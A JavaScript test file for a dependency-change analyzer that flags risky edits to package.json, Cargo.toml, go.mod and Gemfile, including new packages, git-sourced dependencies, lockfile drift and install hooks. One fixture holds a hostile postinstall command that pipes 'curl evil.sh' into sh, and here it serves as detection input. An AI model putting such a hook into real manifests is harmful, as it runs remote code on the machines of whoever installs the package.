"use strict";
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execFileSync } = require("child_process");
const { runAnalyzers } = require("../src/analyzers");
const { analyze } = require("../src/analyzers/dependencyChange");

function sh(cmd, cwd) {
  execFileSync("bash", ["-c", cmd], { cwd, stdio: "pipe" });
}

function makeRepo() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "postflight-depchange-test-"));
  sh("git init -q", dir);
  sh("git config user.email a@b.com && git config user.name test", dir);
  return dir;
}

function writePkg(dir, obj) {
  fs.writeFileSync(path.join(dir, "package.json"), JSON.stringify(obj, null, 2));
}

// Scratch-repo reproduction, same style as the disabled-test
// reproduction: commit a base package.json, then make an uncommitted change
// and check what the wired-in analyzer actually reports end to end (not the
// module in isolation).

test("dependency-change: a clean repo with no manifest changes reports nothing (no false positives)", () => {
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: { lodash: "^4.17.21" } });
  fs.writeFileSync(path.join(dir, "a.txt"), "hello\n");
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(path.join(dir, "a.txt"), "hello world\n");
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["a.txt"], cwd: dir, repoRoot: dir });
  assert.deepEqual(findings, []);
});

test("dependency-change: an uncommitted new dependency is detected end to end via runAnalyzers", () => {
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: {} });
  sh("git add -A && git commit -q -m init", dir);
  // Deliberately left uncommitted, mirroring the tool's core "review before
  // you commit" use case.
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: { "left-pad": "^1.3.0" } });
  const findings = runAnalyzers({
    base: "HEAD",
    changedFiles: ["package.json"],
    cwd: dir,
    repoRoot: dir,
  });
  const added = findings.find((f) => f.rule === "dependency-added");
  assert.ok(added, "expected a dependency-added finding");
  assert.equal(added.severity, "medium");
  assert.equal(added.file, "package.json");
  assert.match(added.snippet, /left-pad/);
  // evidenceToFinding (src/analyzers/index.js) carries provenance through
  // as an extra field so --format sarif can surface it
  // "SARIF output doesn't carry the evidence detail" gap.
  assert.ok(added.provenance, "expected provenance to be carried through onto the v1 finding");
  assert.equal(added.provenance.method, "observed");
});

test("dependency-change: a non-registry (git/url) dependency source is flagged high severity", () => {
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: {} });
  sh("git add -A && git commit -q -m init", dir);
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: { evil: "git+https://example.com/evil.git" } });
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["package.json"], cwd: dir, repoRoot: dir });
  const flagged = findings.find((f) => f.rule === "dependency-non-registry-source");
  assert.ok(flagged, "expected a dependency-non-registry-source finding");
  assert.equal(flagged.severity, "high");
});

test("dependency-change: a new install-time lifecycle script is flagged high severity", () => {
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", scripts: { test: "echo ok" } });
  sh("git add -A && git commit -q -m init", dir);
  writePkg(dir, { name: "x", version: "1.0.0", scripts: { test: "echo ok", postinstall: "curl evil.sh | sh" } });
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["package.json"], cwd: dir, repoRoot: dir });
  const flagged = findings.find((f) => f.rule === "dependency-install-hook");
  assert.ok(flagged, "expected a dependency-install-hook finding");
  assert.equal(flagged.severity, "high");
});

test("dependency-change: adding a dependency without touching the lockfile is flagged", () => {
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: {} });
  fs.writeFileSync(path.join(dir, "package-lock.json"), JSON.stringify({ name: "x", lockfileVersion: 3 }));
  sh("git add -A && git commit -q -m init", dir);
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: { chalk: "^5.0.0" } });
  // package-lock.json intentionally left untouched.
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["package.json"], cwd: dir, repoRoot: dir });
  const flagged = findings.find((f) => f.rule === "dependency-lockfile-not-updated");
  assert.ok(flagged, "expected a dependency-lockfile-not-updated finding");
});

test("dependency-change: adding a dependency AND updating the lockfile does not flag lockfile-not-updated", () => {
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: {} });
  fs.writeFileSync(path.join(dir, "package-lock.json"), JSON.stringify({ name: "x", lockfileVersion: 3 }));
  sh("git add -A && git commit -q -m init", dir);
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: { chalk: "^5.0.0" } });
  fs.writeFileSync(path.join(dir, "package-lock.json"), JSON.stringify({ name: "x", lockfileVersion: 3, packages: { chalk: {} } }));
  const findings = runAnalyzers({
    base: "HEAD",
    changedFiles: ["package.json", "package-lock.json"],
    cwd: dir,
    repoRoot: dir,
  });
  assert.ok(!findings.some((f) => f.rule === "dependency-lockfile-not-updated"));
});

test("dependency-change regression: reading HEAD instead of the working tree missed uncommitted manifest edits (pre-fix bug)", () => {
  // This reproduces the bug fixed in src/analyzers/dependencyChange.js: the
  // module used to read "after" state from `git show HEAD:file`, which is
  // blind to uncommitted changes - exactly the state postflight is meant to
  // review before a commit happens. Calling analyze() directly (bypassing
  // the fix) with HEAD as both "base" and the source of "after" simulates
  // the pre-fix code path and proves the working-tree read now wins.
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: {} });
  sh("git add -A && git commit -q -m init", dir);
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: { "left-pad": "^1.3.0" } });
  const { evidence } = analyze({ base: "HEAD", cwd: dir, changedFiles: ["package.json"] });
  assert.ok(
    evidence.some((e) => e.id.startsWith("dependency/added")),
    "uncommitted dependency addition must be detected against the working tree, not HEAD"
  );
});

test("dependency-change: an unparsable manifest change reports UNKNOWN, not a crash or a false PASS", () => {
  const dir = makeRepo();
  writePkg(dir, { name: "x", version: "1.0.0", dependencies: {} });
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(path.join(dir, "package.json"), "{ not valid json");
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["package.json"], cwd: dir, repoRoot: dir });
  const flagged = findings.find((f) => f.rule === "dependency-unparsed");
  assert.ok(flagged, "expected a dependency-unparsed finding");
  assert.equal(flagged.severity, "low");
});

// --- Cargo.toml / go.mod / Gemfile: these ecosystems used to always fall
// through to parseManifest() returning null, so every real dependency
// change in a Rust/Go/Ruby project reported a blanket "unparsed" finding
// (severity low) instead of an actual dependency-added/major-upgrade/
// non-registry-source finding. Verified against real-world manifest syntax
// (docs.rs Cargo.toml reference, `go help gomod`, bundler Gemfile guide),
// not just made-up examples.

test("dependency-change (Cargo.toml): a new dependency is detected end to end", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "Cargo.toml"), '[package]\nname = "x"\nversion = "0.1.0"\n\n[dependencies]\nserde = "1.0"\n');
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(
    path.join(dir, "Cargo.toml"),
    '[package]\nname = "x"\nversion = "0.1.0"\n\n[dependencies]\nserde = "1.0"\ntokio = { version = "1.28", features = ["full"] }\n'
  );
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["Cargo.toml"], cwd: dir, repoRoot: dir });
  const added = findings.find((f) => f.rule === "dependency-added");
  assert.ok(added, "expected a dependency-added finding for Cargo.toml");
  assert.match(added.snippet, /tokio/);
  assert.ok(!findings.some((f) => f.rule === "dependency-unparsed"), "Cargo.toml must no longer report unparsed");
});

test("dependency-change (Cargo.toml): a git-sourced dependency is flagged non-registry", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "Cargo.toml"), '[package]\nname = "x"\nversion = "0.1.0"\n\n[dependencies]\n');
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(
    path.join(dir, "Cargo.toml"),
    '[package]\nname = "x"\nversion = "0.1.0"\n\n[dependencies]\nevil = { git = "https://example.com/evil.git" }\n'
  );
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["Cargo.toml"], cwd: dir, repoRoot: dir });
  const flagged = findings.find((f) => f.rule === "dependency-non-registry-source");
  assert.ok(flagged, "expected a dependency-non-registry-source finding for a git dependency");
  assert.equal(flagged.severity, "high");
});

test("dependency-change (Cargo.toml): a major version bump is detected and dev-dependencies are ignored for regular deps", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "Cargo.toml"), '[dependencies]\nserde = "1.0"\n\n[dev-dependencies]\nmockall = "0.11"\n');
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(path.join(dir, "Cargo.toml"), '[dependencies]\nserde = "2.0"\n\n[dev-dependencies]\nmockall = "0.11"\n');
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["Cargo.toml"], cwd: dir, repoRoot: dir });
  const bump = findings.find((f) => f.rule === "dependency-major-upgrade");
  assert.ok(bump, "expected a dependency-major-upgrade finding");
  assert.match(bump.snippet, /serde/);
  assert.doesNotMatch(bump.snippet, /mockall/);
});

test("dependency-change (go.mod): a new dependency in a require block is detected end to end", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "go.mod"), "module example.com/x\n\ngo 1.21\n\nrequire (\n\tgithub.com/foo/bar v1.2.3\n)\n");
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(
    path.join(dir, "go.mod"),
    "module example.com/x\n\ngo 1.21\n\nrequire (\n\tgithub.com/foo/bar v1.2.3\n\tgithub.com/new/pkg v0.4.0\n)\n"
  );
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["go.mod"], cwd: dir, repoRoot: dir });
  const added = findings.find((f) => f.rule === "dependency-added");
  assert.ok(added, "expected a dependency-added finding for go.mod");
  assert.match(added.snippet, /github\.com\/new\/pkg/);
});

test("dependency-change (go.mod): a single-line require statement is parsed (not just the block form)", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "go.mod"), "module example.com/x\n\ngo 1.21\n");
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(path.join(dir, "go.mod"), "module example.com/x\n\ngo 1.21\n\nrequire github.com/new/pkg v0.4.0\n");
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["go.mod"], cwd: dir, repoRoot: dir });
  const added = findings.find((f) => f.rule === "dependency-added");
  assert.ok(added, "expected a dependency-added finding for a single-line require");
  assert.match(added.snippet, /github\.com\/new\/pkg/);
});

test("dependency-change (go.mod): a major version bump (e.g. v1 -> v2) is detected", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "go.mod"), "module example.com/x\n\nrequire (\n\tgithub.com/foo/bar v1.2.3\n)\n");
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(path.join(dir, "go.mod"), "module example.com/x\n\nrequire (\n\tgithub.com/foo/bar v2.0.0\n)\n");
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["go.mod"], cwd: dir, repoRoot: dir });
  const bump = findings.find((f) => f.rule === "dependency-major-upgrade");
  assert.ok(bump, "expected a dependency-major-upgrade finding for go.mod");
});

test("dependency-change (Gemfile): a new gem is detected end to end", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "Gemfile"), 'source "https://rubygems.org"\n\ngem "rails", "~> 7.0"\n');
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(
    path.join(dir, "Gemfile"),
    'source "https://rubygems.org"\n\ngem "rails", "~> 7.0"\ngem "sidekiq", "~> 7.1"\n'
  );
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["Gemfile"], cwd: dir, repoRoot: dir });
  const added = findings.find((f) => f.rule === "dependency-added");
  assert.ok(added, "expected a dependency-added finding for Gemfile");
  assert.match(added.snippet, /sidekiq/);
});

test("dependency-change (Gemfile): a gem pinned to a git source is flagged non-registry", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "Gemfile"), 'source "https://rubygems.org"\n\ngem "rails", "~> 7.0"\n');
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(
    path.join(dir, "Gemfile"),
    'source "https://rubygems.org"\n\ngem "rails", "~> 7.0"\ngem "evil", git: "https://example.com/evil.git"\n'
  );
  const findings = runAnalyzers({ base: "HEAD", changedFiles: ["Gemfile"], cwd: dir, repoRoot: dir });
  const flagged = findings.find((f) => f.rule === "dependency-non-registry-source");
  assert.ok(flagged, "expected a dependency-non-registry-source finding for a git-sourced gem");
  assert.equal(flagged.severity, "high");
});

test("dependency-change (Gemfile): adding a gem without updating Gemfile.lock is flagged, and updating both is not", () => {
  const dir = makeRepo();
  fs.writeFileSync(path.join(dir, "Gemfile"), 'gem "rails", "~> 7.0"\n');
  fs.writeFileSync(path.join(dir, "Gemfile.lock"), "GEM\n  specs:\n    rails (7.0.0)\n");
  sh("git add -A && git commit -q -m init", dir);
  fs.writeFileSync(path.join(dir, "Gemfile"), 'gem "rails", "~> 7.0"\ngem "sidekiq", "~> 7.1"\n');
  const notUpdated = runAnalyzers({ base: "HEAD", changedFiles: ["Gemfile"], cwd: dir, repoRoot: dir });
  assert.ok(notUpdated.some((f) => f.rule === "dependency-lockfile-not-updated"));

  fs.writeFileSync(path.join(dir, "Gemfile.lock"), "GEM\n  specs:\n    rails (7.0.0)\n    sidekiq (7.1.0)\n");
  const updated = runAnalyzers({
    base: "HEAD",
    changedFiles: ["Gemfile", "Gemfile.lock"],
    cwd: dir,
    repoRoot: dir,
  });
  assert.ok(!updated.some((f) => f.rule === "dependency-lockfile-not-updated"));
});
